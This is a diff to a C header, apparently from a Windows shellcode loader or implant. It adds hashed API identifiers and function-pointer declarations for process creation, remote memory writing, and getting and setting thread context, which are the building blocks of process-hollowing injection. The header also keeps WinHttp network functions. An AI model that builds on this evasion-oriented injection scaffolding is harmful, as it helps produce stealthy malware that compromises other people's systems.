@@ -38,8 +38,13 @@
 #define HASHED_CreateThread                0x7f08f451
 #define HASHED_NtFreeVirtualMemory         0x471aa7e9
 #define HASHED_RegisterWaitForSingleObject 0xccf99aff
-#define HASHED_UnregisterWait              0x9b9c8042
 #define HASHED_CloseHandle                 0x3870ca07
+#define HASHED_CreateProcessA              0xaeb52e19
+#define HASHED_NtWriteVirtualMemory        0x95f3a792
+
+#define HASHED_NtResumeThread              0x2c7b3d30
+#define HASHED_NtGetContextThread          0x9e0e1a44
+#define HASHED_NtSetContextThread          0x308be0d0
 
 typedef HLOCAL(WINAPI *pLocalAlloc)(UINT uFlags, SIZE_T uBytes);
 typedef HLOCAL(WINAPI* pLocalReAlloc)(HLOCAL hMem, SIZE_T uBytes, UINT uFlags);
@@ -94,6 +99,14 @@ typedef NTSTATUS (NTAPI *pNtFreeVirtualMemory)(
     ULONG   FreeType
 );
 
+typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
+    HANDLE  ProcessHandle,
+    PVOID   BaseAddress,
+    PVOID   Buffer,
+    ULONG   NumberOfBytesToWrite,
+    PULONG  NumberOfBytesWritten
+);
+
 
 typedef HANDLE (WINAPI *pCreateThread)(
     LPSECURITY_ATTRIBUTES  lpThreadAttributes,
@@ -102,6 +115,22 @@ typedef HANDLE (WINAPI *pCreateThread)(
     LPVOID                 lpParameter,
     DWORD                  dwCreationFlags,
     LPDWORD                lpThreadId
+);
+
+
+typedef NTSTATUS(NTAPI *pNtResumeThread)(HANDLE hThread, PULONG PreCOunt);
+
+typedef BOOL (WINAPI *pCreateProcessA)(
+    LPCSTR                lpApplicationName,
+    LPSTR                 lpCommandLine,
+    LPSECURITY_ATTRIBUTES lpProcessAttributes,
+    LPSECURITY_ATTRIBUTES lpThreadAttributes,
+    BOOL                  bInheritHandles,
+    DWORD                 dwCreationFlags,
+    LPVOID                lpEnvironment,
+    LPCSTR                lpCurrentDirectory,
+    LPSTARTUPINFOA        lpStartupInfo,
+    LPPROCESS_INFORMATION lpProcessInformation
 );
 
 
@@ -115,13 +144,12 @@ typedef BOOL (WINAPI *pRegisterWaitForSingleObject)(
     ULONG              dwFlags
 );
 
-typedef BOOL (WINAPI *pUnregisterWait)(HANDLE WaitHandle);
-
 typedef BOOL (WINAPI *pCloseHandle)(HANDLE hObject);
 typedef BOOL (WINAPI *pFreeLibrary)(HMODULE hLibModule);
 typedef NTSTATUS(NTAPI* pNtDelayExecution)(BOOL Alertable, PLARGE_INTEGER Delay);
 
-
+typedef NTSTATUS(NTAPI *pNtGetContextThread)(HANDLE hThread, PCONTEXT ctx);
+typedef NTSTATUS(NTAPI *pNtSetContextThread)(HANDLE hThread, PCONTEXT ctx);
 
 typedef struct _Win32 {
     // win32
@@ -130,10 +158,11 @@ typedef struct _Win32 {
     pLocalReAlloc    LocalReAlloc;
     pGetProcAddress  GetProcAddress;
     pLoadLibraryA    LoadLibraryA;
-    pUnregisterWait  UnregisterWait;
     pRegisterWaitForSingleObject RegisterWaitForSingleObject;
     pCloseHandle CloseHandle;
     pCreateThread CreateThread;
+    
+    pCreateProcessA CreateProcessA;
     pFreeLibrary FreeLibrary;
 
 
@@ -142,7 +171,11 @@ typedef struct _Win32 {
     pNtAllocateVirtualMemory NtAllocateVirtualMemory;
     pNtFlushInstructionCache NtFlushInstructionCache;
     pNtFreeVirtualMemory NtFreeVirtualMemory;
+    pNtWriteVirtualMemory NtWriteVirtualMemory;
     pNtDelayExecution    NtDelayExecution;
+    pNtResumeThread      NtResumeThread;
+    pNtGetContextThread NtGetContextThread;
+    pNtSetContextThread NtSetContextThread;
 
     // winhttp
     pWinHttpOpen               WinHttpOpen;
